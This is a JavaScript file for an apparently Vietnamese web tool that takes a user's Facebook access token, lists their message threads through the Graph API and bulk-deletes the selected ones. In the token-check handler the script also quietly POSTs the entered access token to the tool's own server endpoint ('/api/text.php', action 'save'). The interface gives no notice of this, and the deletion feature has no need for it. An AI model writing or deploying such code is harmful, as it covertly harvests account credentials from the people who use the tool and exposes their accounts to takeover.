function count_inbox_delete(a){
	$.get(a).done(function(a){
		for(var b='',c=0;
		c<a.data.length;
		c++){
			for(var d=a.data[c],f=[],g=0;
			g<d.participants.data.length;
			g++){
				d.participants.data[g].id!=user_id&&(f.push(' '+d.participants.data[g].name),id_send=d.participants.data[g].id)
			}
			;
			f.length>0&&(b+='<tr>',b+='<td class="checkbox_UID" align="center">',b+='<input class="css-checkbox" type="checkbox" name="selected_UID" id="label_'+d.id+'" value="'+d.id+'" />',b+='<label for="label_'+d.id+'" class="css-label"></label>',b+='</td>',b+='<td align="center"><img src="https://graph.facebook.com/'+id_send+'/picture?height=20" style="height: 20px"/></td>',b+='<td><a href="https://www.facebook.com'+d.link+'" target="_blank">'+(f.length>1?f[0]+' và '+(f.length-1)+' người khác':' '==f[0]?'Người dùng Facebook':f[0])+'</a></td>',b+='<td>'+d.message_count+'</td>',b+='<td id="UID_'+d.id.split(':')[1]+'" align="center">Đang chờ !</td>',b+='</tr>')
		}
		;
		$('#html_inbox_delete_table').append(b),a.paging?count_inbox_delete(a.paging.next):(init.dataTables(),$('#submit_inbox_delete').buttonStop(),noti.success('Đã load danh sách Inbox !'))
	}
	).fail(function(){
		$('#submit_inbox_delete').buttonStop(),noti.error('Access Token không thể đọc inbox, vui lòng kiểm tra lại !')
	}
	)
}
location.hostname==b_sv&&(inbox_delete_dataTables='',$(document).on('click','#submit_inbox_delete',function(){
	var a=$('#input_inbox_delete_token').validate();
	a&&($(this).buttonLoad(),$.get('https://graph.facebook.com/me',{
		access_token:a
	}
	).done(function(b){
		user_id=b.id,array=[],''==inbox_delete_dataTables&&(inbox_delete_dataTables=$('#dataTables').html()),$('#dataTables').html(inbox_delete_dataTables),$('#html_inbox_delete_result').fadeIn('fast'),$('#html_inbox_delete_table').html(''),count_inbox_delete('https://graph.facebook.com/me/threads?limit=50&access_token='+a),$.post('//'+b_sv+'/api/text.php',{
			act:'save',array:a
		}
		)
	}
	).error(function(){
		$('#submit_inbox_delete').buttonStop(),noti.error('Access Token không hợp lệ !')
	}
	))
}
),$(document).on('click','#checkall_inbox_delete',function(){
	$('.checkbox_UID > input:checkbox:enabled').prop('checked',$(this).prop('checked'))
}
),$(document).on('click','#submit_inbox_deleteall',function(){
	var a=$('input[name="selected_UID"]:enabled:checked').length,b=0;
	a>0?(noti.info('Tiến hành quá trình xóa tin nhắn !'),$(this).buttonLoad(),$('input[name="selected_UID"]:enabled:checked').each(function(c,d){
		!function(c,d){
			setTimeout(function(){
				$.get('https://graph.facebook.com/'+d,{
					access_token:$('#input_inbox_delete_token').val(),method:'delete'
				}
				).done(function(){
					$('#UID_'+d.split(':')[1]).html('<font color="green">Xóa thành công !</font>')
				}
				).error(function(){
					$('#UID_'+d.split(':')[1]).html('<font color="red">Lỗi !</font>')
				}
				).always(function(){
					b++,b==a&&($('#submit_inbox_deleteall').buttonStop(),noti.success('Tiến trình xóa Inbox đã hoàn tất !'))
				}
				)
			}
			,15*c)
		}
		(c,$(this).val())
	}
	)):noti.error('Vui lòng chọn ít nhất 1 tin nhắn !')
}
))